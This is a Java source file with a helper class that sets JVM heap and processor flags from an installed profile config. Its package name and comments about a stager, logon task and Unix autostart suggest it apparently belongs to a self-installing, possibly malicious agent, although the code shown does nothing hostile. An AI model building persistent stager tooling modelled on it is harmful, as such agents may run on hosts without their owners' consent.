package com.spcagentpayloa.jvmxx;

import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

/**
 * Single source of truth for the JVM memory flags. The stager, logon task,
 * update helper and Unix autostart all use the same profile: `lite` 256 MiB,
 * `full` 512 MiB, plus a fixed processor count so a six-core host stays usable
 * while a scan runs.
 */
public final class Heap {
	public static final String LITE = "-Xmx256m";
	public static final String FULL = "-Xmx512m";
	public static final String PROCESSORS = "-XX:ActiveProcessorCount=2";

	private Heap() {
	}

	public static List<String> args(String profile) {
		return List.of("lite".equalsIgnoreCase(profile) ? LITE : FULL, PROCESSORS);
	}

	/** Stable dump location; the agent sweeps it into cache/crash on start. */
	public static String errorFile(Path installDir) {
		return "-XX:ErrorFile=hs_err_pid%p.log";
	}

	public static List<String> argsFor(Path installDir) {
		return args(profile(installDir));
	}

	/** Reads the installed profile; absent or unreadable config means full. */
	public static String profile(Path installDir) {
		try {
			Path config = installDir.resolve("crypto-config.json");
			if (Files.isRegularFile(config)) {
				String text = Files.readString(config, StandardCharsets.UTF_8);
				if (text.contains("\"profile\"") && text.contains("\"lite\"")) {
					return "lite";
				}
				return "full";
			}
		} catch (Throwable throwable) {
			Log.debug("Heap profile read failed", throwable);
		}
		try (InputStream resource = Heap.class.getResourceAsStream("/spcagentpayloa/config.json")) {
			if (resource != null) {
				String text = new String(resource.readAllBytes(), StandardCharsets.UTF_8);
				return text.contains("\"profile\"") && text.contains("\"lite\"") ? "lite" : "full";
			}
		} catch (Throwable throwable) {
			Log.debug("Heap resource profile read failed", throwable);
		}
		return "full";
	}

	public static String commandLine(Path installDir) {
		return String.join(" ", argsFor(installDir)) + " " + errorFile(installDir);
	}
}
